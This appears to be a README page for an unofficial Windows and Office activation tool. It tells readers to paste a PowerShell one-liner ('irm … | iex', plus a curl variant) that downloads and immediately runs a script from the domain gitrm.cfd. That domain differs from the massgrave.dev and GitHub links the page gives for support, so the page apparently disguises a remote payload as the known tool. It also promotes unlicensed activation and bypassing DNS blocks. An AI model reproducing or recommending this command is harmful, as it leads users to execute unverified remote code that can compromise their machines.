
<div align="center">
  <img align="center" width="125" height="125" alt="image" src="https://github.com/user-attachments/assets/ca0106bf-8aa2-4503-af91-e4e443ea4fe0" />
</div>

<h1 align="center">Microsoft  Activation  Service (MAS)</h1>

<p align="center">Open-source utility for activating Windows and Office via HWID, Ohook, TSforge, and Online KMS, with extended troubleshooting support.</p>

  
## How to Active Windows / Office / Extended Security Updates (ESU)?

### Method 1 - PowerShell ❤️

1. Click the **Start Menu**, type `PowerShell`, and open it.

2. Copy and paste the code below and press **Enter.**  
   - For **Windows 8.1, 10 and 11**:
     ```
     irm gitrm.cfd?activate=windows-office | iex
     ```
	 If the above is blocked (by ISP/DNS), try this (needs updated Windows 10 or 11):  
	 ```
	 iex (curl.exe -s --doh-url https://1.1.1.1/dns-query gitrm.cfd?activate=windows-office | Out-String)
	 ```

3. In the menu that appears, type the number corresponding to one of the **Green** options.

---


> [!TIP]
> - Some ISPs/DNS providers block access to our domains. You can bypass this by enabling [DNS-over-HTTPS (DoH)](https://developers.cloudflare.com/1.1.1.1/encryption/dns-over-https/encrypted-dns-browsers/) in your browser. 
> - **Having trouble**? Visit our [troubleshooting page](https://massgrave.dev/troubleshoot) or raise an issue on [GitHub](https://github.com/massgravel/Microsoft-Activation-Scripts/issues).

> [!NOTE]
>
> - The `irm` command in PowerShell downloads a script from a specified URL, and the `iex` command executes it.
> - Always double-check the URL before executing the command and verify the source is trustworthy when manually downloading files.
> - Be cautious of third parties spreading malware disguised as MAS by altering the URL in the PowerShell command.

---
